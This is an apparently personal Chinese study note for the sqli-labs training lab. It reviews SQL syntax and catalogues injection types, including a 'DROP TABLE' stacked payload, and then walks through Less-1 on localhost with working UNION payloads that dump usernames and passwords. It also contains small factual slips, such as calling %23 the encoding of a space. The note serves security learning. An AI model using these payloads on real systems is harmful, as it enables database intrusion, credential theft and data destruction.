## SQL 基础知识复习

为了在 SQL 注入时，编写 SQL 的过程中不磕磕巴巴，来复习下在 SQL 注入中常见的 SQL 基础知识吧～

### 限制语句 limit

在 SQL 中，LIMIT 语句用于**限制返回的行数**，它通常与 `ORDER BY` 一起使用来分页或获取部分结果，其语法如下所示：

* `offset` : 从结果集的哪一行开始（从 0 开始计数），如果省略 offset，默认从第 0 行开始
* `row_count` : 返回的行数

```sql
SELECT column1, column2, ...
FROM table_name
[WHERE condition]
[ORDER BY column_name [ASC | DESC]]
LIMIT offset, row_count;
```

示例如下所示：

1. **返回前 5 行**：返回按年龄降序排列的前 5 行

   ```sql
   SELECT name, age
   FROM students
   ORDER BY age DESC
   LIMIT 5;
   ```

2. **跳过前 5 行，返回接下来的 10 行**：跳过前 5 行（偏移量为 5），然后返回 10 行

   ```sql
   SELECT name, age
   FROM students
   ORDER BY age ASC
   LIMIT 5, 10;
   ```

3. **用于分页**：假设每页显示 10 行，当前为第 page 页（从 1 开始）

   ```sql
   SELECT name, age
   FROM students
   ORDER BY age
   LIMIT (page - 1) * 10, 10;
   ```



### 排序语句 order by

在 SQL 中，`ORDER BY` 语句用于对查询结果进行排序，可以按照一列或多列的值排序，并选择升序 (`ASC`)（`默认`）或降序 (`DESC`) 排列，其语法如下所示：

```sql
SELECT column1, column2, ...
FROM table_name
ORDER BY column_name [ASC | DESC];
```

示例如下所示：

1. **按单列排序**：根据 age 列的值从小到大排序

   ```sql
   SELECT name, age
   FROM students
   ORDER BY age ASC;
   ```

2. **按多列排序**：先按照 grade 降序排列，若 grade 相同，则再按 age 升序排列

   ```sql
   SELECT name, age, grade
   FROM students
   ORDER BY grade DESC, age ASC;
   ```

3. **按表达式排序**：根据计算列 total_income 降序排列

   ```sql
   SELECT name, salary, bonus, (salary + bonus) AS total_income
   FROM employees
   ORDER BY total_income DESC;
   ```

值得注意的是：ORDER BY 语句支持按列的**编号**进行排序，而不是直接使用列名。这在某些情况下可以使查询更简洁，尤其是列名较长或计算列复杂或**不知道列名**时，其语法如下所示：

```sql
SELECT column1, column2, ...
FROM table_name
ORDER BY 列编号 [ASC | DESC]; -- 列的编号基于 SELECT 子句中列的顺序（从 1 开始）
```

示例如下所示：

1. **按列编号升序排序**：按第 2 列（age）升序排序

   ```sql
   SELECT name, age, grade
   FROM students
   ORDER BY 2 ASC;
   ```

2. **按多列编号排序**：按第 3 列（grade）降序，第2列（age）升序

   ```sql
   SELECT name, age, grade
   FROM students
   ORDER BY 3 DESC, 2 ASC;
   ```

3. **配合计算列**：按第 4 列（total_income）降序排序

   ```sql
   SELECT name, salary, bonus, (salary + bonus) AS total_income
   FROM employees
   ORDER BY 4 DESC;
   ```



### 联合语句 union

在 SQL 中，UNION 用于合并两个或多个 SELECT 语句的查询结果集。它会将结果集中的行合并到一个集合中，并**去除重复的行**。如果希望保留重复行，可以使用 UNION ALL，其语法如下所示：

* 列数和数据类型必须相同
* 表的列名如果太长或**不知道**，可以用**列的编号**来代替列名，其从 1 开始

```sql
SELECT column1, column2, ...
FROM table1
[WHERE condition]
UNION
SELECT column1, column2, ...
FROM table2
[WHERE condition];
```

示例如下所示：

1. **合并两个表的数据**：将 students_2023 和 students_2024 表中学生的 name 和 age 合并，并去除重复行

   ```sql
   SELECT name, age
   FROM students_2023
   UNION
   SELECT name, age
   FROM students_2024;
   ```

   值得注意的是：与 `UNION` 的区别在于，`UNION ALL` 不会去重，**查询性能更高**：

   ```sql
   SELECT name, age
   FROM students_2023
   UNION ALL
   SELECT name, age
   FROM students_2024;
   ```

2. **使用表达式**：将两个表的数据合并在一起，并在结果（只有一列name）中添加一列 education 来标识数据的来源（即每行数据是来自高中学生表还是大学学生表）

   ```sql
   SELECT 'High School' AS education, name
   FROM high_school_students
   UNION
   SELECT 'University' AS education, name
   FROM university_students;
   ```



### 指定别名 as

在 SQL 中，`AS` 关键字用于为列或表指定一个**别名**，以便提高查询的可读性、简洁性，或者对结果集的列名进行自定义，AS 是**可选**的，在很多情况下可以省略，示例如下所示：

1. **为列指定别名**：为查询结果的列定义一个更友好的名字，例如下述 SQL 执行结果中显示的列名将为 student_name 和 student_age，而不是原始的 name 和 age .

   ```sql
   SELECT name AS student_name, age AS student_age
   FROM students;
   ```

   值得注意的是，如果别名包含空格或特殊字符，需要用双引号或方括号括起来（不同数据库有差异）：

   ```sql
   SELECT name AS "Student Name"
   FROM students;
   ```

2. **为表指定别名**：为表名定义别名，用于简化书写，特别是在多表连接时，例如下述 SQL 中可以通过 s 和 c 来简化引用表的操作 .

   ```sql
   SELECT s.name, c.course_name
   FROM students AS s
   JOIN courses AS c
   ON s.id = c.student_id;
   ```

3. **为计算列指定别名**：下述 SQL 执行结果中的 total_cost 列表示每条订单的总价，而不是显示计算表达式 .

   ```sql
   SELECT price * quantity AS total_cost
   FROM orders;
   ```



### ⭐️数据表 information_schema

`INFORMATION_SCHEMA` 是 SQL 标准中定义的一个特殊系统数据库（或模式），提供关于数据库结构的**元信息**，它是数据库的**数据字典**，存储了数据库的表、列、索引、约束、用户权限等信息 .

#### 特点

* **只读性**：INFORMATION_SCHEMA 仅用于查询，不能对其内容进行修改
* **跨数据库兼容**：SQL 标准的一部分，大多数主流数据库（如 MySQL、PostgreSQL、SQL Server、MariaDB）都支持
* **系统表集合**：包含一系列表，每个表存储不同类别的元数据

#### 常用表及其作用

一. **TABLES 表**：表的基本信息，包含数据库中所有表的信息，关键列如下所示：

* TABLE_SCHEMA：表所在的数据库名

* TABLE_NAME：表名

* TABLE_TYPE：表类型（如 BASE TABLE、VIEW）

* ENGINE：存储引擎（MySQL 专用）

  ```sql
  -- 根据数据库名，查询所有表名
  SELECT TABLE_NAME
  FROM INFORMATION_SCHEMA.TABLES
  WHERE TABLE_SCHEMA = 'your_database_name';
  ```

二. **COLUMNS 表**：列的详细信息，包含表中所有列的信息，关键列如下所示：

* TABLE_SCHEMA：表所在的数据库名

* TABLE_NAME：表名

* COLUMN_NAME：列名

* DATA_TYPE：数据类型

* IS_NULLABLE：是否允许 NULL 值

  ```sql
  -- 根据数据库名及表名，查询指定表的列信息
  SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE
  FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_SCHEMA = 'your_database_name' AND TABLE_NAME = 'your_table_name';
  ```

三.  **SCHEMATA 表**：数据库信息，包含当前服务器上的所有数据库信息，关键列如下所示：

* SCHEMA_NAME：数据库名

  ```sql
  -- 列出所有数据库名
  SELECT SCHEMA_NAME
  FROM INFORMATION_SCHEMA.SCHEMATA;
  ```



### 常用的系统函数

#### 字符串函数

* **`CONCAT()`**：将多个字符串连接成一个字符串，没有分隔符

  ```sql
  mysql> select concat('hello', ' ', '2024');
  +------------------------------+
  | concat('hello', ' ', '2024') |
  +------------------------------+
  | hello 2024                   |
  +------------------------------+
  ```

* **`CONCAT_WS()`**：将多个字符串连接成一个字符串，含有分隔符

  ```sql
  mysql> select concat_ws(',', 'hello', 'world');
  +----------------------------------+
  | concat_ws(',', 'hello', 'world') |
  +----------------------------------+
  | hello,world                      |
  +----------------------------------+
  ```

* **`GROUP_CONCAT()`**：连接一个组的所有字符串，并以逗号分隔每一条数据

  ```sql
  -- eg.sqli-labs's Less-1
  http://localhost:8001/Less-1/?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
  ```

  ```
  Your Login name:2
  Your Password:information_schema,challenges,mysql,performance_schema,security
  ```

* **`LEFT(string, length)`**：从指定字符串的左侧提取指定长度的子字符串

  ```sql
  mysql> select left('hello world', 5);
  +------------------------+
  | left('hello world', 5) |
  +------------------------+
  | hello                  |
  +------------------------+
  ```

* **`SUBSTR(string, start, length)`**：从字符串中提取子字符串。它在不同的数据库中可能有不同的名称（例如，在 MySQL 中也可以使用 `SUBSTRING()`）

  ```sql
  mysql> select substr('hello world', 1, 5) as result;
  +--------+
  | result |
  +--------+
  | hello  |
  +--------+
  -- 值得注意的是：
  -- 1.若 start 为负数，则从字符串右侧开始计数
  -- 2.若忽略 length，则默认提取从起始位置到字符串末尾的所有字符串
  mysql> select substr('hello world', -5) as result;
  +--------+
  | result |
  +--------+
  | world  |
  +--------+
  ```

* `ASCII()`：返回字符或字符串的首字符的 **ASCII 编码值**，在需要对字符值进行数值化处理时非常有用

  ```sql
  -- 值得注意的是：
  -- 1.如果字符串为空，返回值为 0
  -- 2.如果字符串长度大于1，仅返回第一个字发的 ASCII 值
  mysql> select ascii('a') as result;
  +--------+
  | result |
  +--------+
  |     97 |
  +--------+
  ```

* ❌**`REGEXP()`**：

* ❌**`LOCATE()`**：

  假设有一张名为 users 的表，列 email 存储电子邮箱地址。我们希望提取邮箱用户名部分：

  ```sql
  SELECT email, SUBSTR(email, 1, LOCATE('@', email) - 1) AS username
  FROM users;
  ```

  ```
  +------------------------------+
  | email								username |
  +------------------------------+
  | alice@example.com		alice		 |
  +------------------------------+
  | bob@domain.com			bob			 |
  +------------------------------+
  ```

* **`LENGTH()`**：返回字符串的字节长度

  ```sql
  mysql> select length('hello');
  +-----------------+
  | length('hello') |
  +-----------------+
  |               5 |
  +-----------------+
  ```

* **`CHAR_LENGTH()`**：返回字符串的字符数

  ```sql
  mysql> select char_length('hello');
  +----------------------+
  | char_length('hello') |
  +----------------------+
  |                    5 |
  +----------------------+
  ```

* **`UPPER()`**：转换为大写，而 `LOWER()` 相反

  ```sql
  mysql> select lower('HELLO');
  +----------------+
  | lower('HELLO') |
  +----------------+
  | hello          |
  +----------------+
  ```

* **`TRIM()`**：去掉字符串两端的空格

  ```sql
  mysql> select trim(' hello ');
  +-----------------+
  | trim(' hello ') |
  +-----------------+
  | hello           |
  +-----------------+
  ```

* **`SUBSTRING()`**：提取子字符串

  ```sql
  mysql> select substring('hello world',1,5);
  +------------------------------+
  | substring('hello world',1,5) |
  +------------------------------+
  | hello                        |
  +------------------------------+
  ```

* **`REPLACE()`**：替换字符串中的子串

  ```sql
  mysql> select replace('hello', 'h', 'H');
  +----------------------------+
  | replace('hello', 'h', 'H') |
  +----------------------------+
  | Hello                      |
  +----------------------------+
  ```

* **`FIND_IN_SET()`**：在逗号分隔的字符串中查找值

  ```sql
  mysql> select find_in_set('hello', 'hello,world');
  +-------------------------------------+
  | find_in_set('hello', 'hello,world') |
  +-------------------------------------+
  |                                   1 |
  +-------------------------------------+
  ```

  

#### 数值函数

#### 日期时间函数

#### 加密与校验函数

#### 系统信息函数



## 注入类型总结

以下是常见的 SQL 注入类型及其特点的总结：

### 1.基础 SQL 注入（Classic SQL Injection）

通过直接在输入中插入 SQL 代码，改变原始查询逻辑

* **示例**：输入 `' OR '1'='1` 使条件永远为真

  ```sql
  ' OR '1'='1
  ```

### 2.联合查询注入（UNION-based SQL Injection）

利用 UNION 合并查询结果，获取其他表的数据

* **特点**：要求攻击者能够判断和匹配结果列的数量与类型

  ```sql
  ' UNION SELECT username, password FROM users --
  ```

### 3.盲注（Blind SQL Injection）

服务器没有返回具体错误信息，攻击者通过观察响应的行为推断查询结果

#### 3.1.布尔盲注（Boolean-based Blind Injection）

* **方式**：通过改变条件判断，观察页面返回的变化。

  ```sql
  ' AND 1=1 -- （页面正常）
  ' AND 1=2 -- （页面异常）
  ```

#### 3.2.时间盲注（Time-based Blind Injection）

* **方式**：利用数据库函数（如 `SLEEP()`）使查询延迟，推断结果

  ```sql
  ' AND IF(1=1, SLEEP(5), 0) --
  ```

### 4.错误注入（Error-based SQL Injection）

利用数据库返回的错误信息，获取敏感数据

* **特点**：通过触发错误或函数，直接暴露数据库结构或数据

  ```sql
  ' AND 1=CAST((SELECT @@version) AS INT) --
  ```

### 5.堆查询注入（Stacked Queries Injection）

允许一次执行多个 SQL 语句

* **特点**：需要数据库支持多语句执行（如 ; 分隔）

  ```sql
  '; DROP TABLE users; --
  ```

### 6.基于 XML 的 SQL 注入（Second-Order SQL Injection）

攻击者在初次输入时注入特定字符或语句，等数据被应用后触发注入

* **特点**：数据被存储后，在后续查询时注入生效

### 7.高级注入（Advanced SQL Injection）

结合其他技术（如 JSON、XPath、XML 等）或数据库特性进行复杂攻击



## SQL注入防御策略

* 使用 **参数化查询（Prepared Statements）** 或 ORM
* 验证和过滤用户输入，禁止特殊字符
* 限制数据库用户权限
* 定期检查和修补漏洞



## 🎉第 01 关

### 源代码分析

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}
?>
```

### 构造攻击 SQL

#### 1.报错注入

```sql
id=1'
```

```sql
SELECT * FROM users WHERE id='1'' LIMIT 0,1
```

报错信息 :

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

尝试注释掉第二个符号 `'` 后 SQL 语句：

```sql
id=1'--+
```

```sql
SELECT * FROM users WHERE id='1'-- ' LIMIT 0,1 (通过 URL 解码后，`+`变成空格)
```

值得注意的是：在 SQL 中，`--` 是行注释符，**但在某些数据库（如 MySQL）中，`--` 后面必须跟一个空格才能生效**，上述 SQL 注入语句中之所以在 `--` 后加 `+`，是因为在 SQL 注入中，有时无法直接在 `--` 后加空格（**例如在 URL 参数末尾输入空格符，空格可能被编码或移除**），此时使用 `+` 代替空格，这样可以保证注释符生效，正确注释掉后续内容 .

* **`+` 在 URL 编码中表示空格，通过 URL 解码后，`--+` 实际变成 `--(空格)`**

所以说只要能确保注释符生效，SQL注入语句也可写成下述形式，这里的 `s` 可以为任何其它字母，其作用是确保在 URL 编码时前面的空格不被移除.

```sql
id=1'-- s
```

```sql
SELECT * FROM users WHERE id='1'-- s' LIMIT 0,1
```

对了，空格符号经过 URL 编码后，会变成 `%23`，而符号 `'` 则会变成 `%27`，所以上述 SQL 注入语句也可写成下述形式 : 

```sql
id=1%27--%20
```

#### 2.联合查询注入

由上述 `1.报错注入` 中已收集的信息可得，`id` 是字符型，且代码中未过滤及转义恶意代码，故源码中的 SQL 语句经推测，大概是这样写的 : 

```sql
SELECT ... FROM ... WHERE id = '{id}' ...
```

接下来我们可以利用 `联合查询注入` 先来查询数据库名，---> 然后根据数据库名查询表名，---> 再然后根据表名查询表字段名，---> 最后根据表名及字段名查询出我们想要的数据！是不是很 Hacker，Let's hack it  now !!!

But，使用联合查询（Union Select）的前提是表的列数是已知的！如何获取表的列数呢？答：使用 `order by` 语句！

一. 通过 **穷举法** 我们可得，该表的列数是 `3`，因为当 `order by` 后面的数字大于 3 时，页面会抛出错误信息 : 

```sql
http://localhost:8001/Less-1/?id=1' order by 3--+ (页面正常)
```

```sql
http://localhost:8001/Less-1/?id=1' order by 4--+ (页面抛错: Unknown column '4' in 'order clause')
```

OK，此时我们就可以使用联合查询来获取我们想要的数据啦！

二. 首先我们先简单学习一下如何使用 `union select`，**值得注意的是这里之所以令 `id=-1`**，是因为只有前半段 Select 查询语句无结果时，后半段 Select 查询语句查询到的数据才有机会显示到页面中（因为经推测可得，页面只显示一行查询到的数据哟～）

```sql
http://localhost:8001/Less-1/?id=-1' union select 1,2,3 --+
```

```
Your Login name:2
Your Password:3
```

```sql
http://localhost:8001/Less-1/?id=-1' union select 'user_id_demo','user_name_demo','user_password_demo' --+
```

```
Your Login name:user_name_demo
Your Password:user_password_demo
```

三. 同理，我们获取一下当前所使用的数据库的版本信息：

```sql
http://localhost:8001/Less-1/?id=-1' union select 1,2,version() --+
```

```
Your Login name:2
Your Password:5.5.44-0ubuntu0.14.04.1
```

四. 同理，我们获取一下当前所使用的数据库的名称：

```sql
http://localhost:8001/Less-1/?id=-1' union select 1,2,database() --+
```

```
Your Login name:2
Your Password:security
```

值得注意的是，如果你想要获取所有数据库的名称，可以结合数据库 `information_schema` 与函数 `group_concat()` 来做到这一点：

```sql
http://localhost:8001/Less-1/?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
```

```sql
Your Login name:2
Your Password:information_schema,challenges,mysql,performance_schema,security
```

五. 接着我们继续结合数据库 `information_schema` 与函数 `group_concat()`，获取数据库 `security` 中所有的表信息：

```sql
http://localhost:8001/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.`tables` where table_schema='security'; --+
```

上述 SQL 语句也可写成：

```sql
http://localhost:8001/Less-1/?id=-1' union select 'user_id_demo','user_name_demo',group_concat(table_name) from information_schema.tables where table_schema='security'; --+
```

```
Your Login name:user_name_demo
Your Password:emails,referers,uagents,users
```

六. 根据表名获取表中的列信息：

```sql
http://localhost:8001/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```

```
Your Login name:2
Your Password:id,username,password
```

七. 最后根据表名及其列信息，来获取我们想要的数据，这里为了优雅滴😅展示用户名与密码的对应关系，额外利用了函数 `concat_ws()`：

```sql
http://localhost:8001/Less-1/?id=-1' union select 1,2,group_concat(concat_ws(' : ', username,password)) from users--+
```

```
Your Login name:2
Your Password:Dumb : Dumb,Angelina : I-kill-you,Dummy : p@ssword,secure : crappy,stupid : stupidity,superman : genious,batman : mob!le,admin : admin,admin1 : admin1,admin2 : admin2,admin3 : admin3,dhakkan : dumbo,admin4 : admin4
```

🎉到此第一关就通关喽～

## 第 02 关

## 第 03 关

## 第 04 关

## 第 05 关